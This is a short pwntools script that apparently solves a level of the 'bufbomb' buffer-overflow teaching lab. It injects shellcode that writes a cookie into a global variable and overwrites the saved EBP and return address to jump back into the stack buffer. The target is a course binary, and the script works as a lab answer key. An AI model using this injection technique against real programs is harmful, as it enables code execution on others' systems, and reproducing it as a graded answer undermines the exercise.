from pwn import *

f = open("./ID", "r")
id = f.read()
f.close()

sh = process(['./bufbomb', '-u', id])

ebp = 0x556834a0
ret = 0x08048d05
cookie = 0x274adc8a
global_value_address = 0x0804c218

shellcode = asm('mov eax, ' + str(global_value_address) + '; mov dword ptr[eax], ' + str(cookie) + '; push ' + str(ret) + '; ret;')

exploit = flat([shellcode.ljust(40, 'a'), ebp, ebp - 40])
sh.sendline(exploit)

sh.interactive()
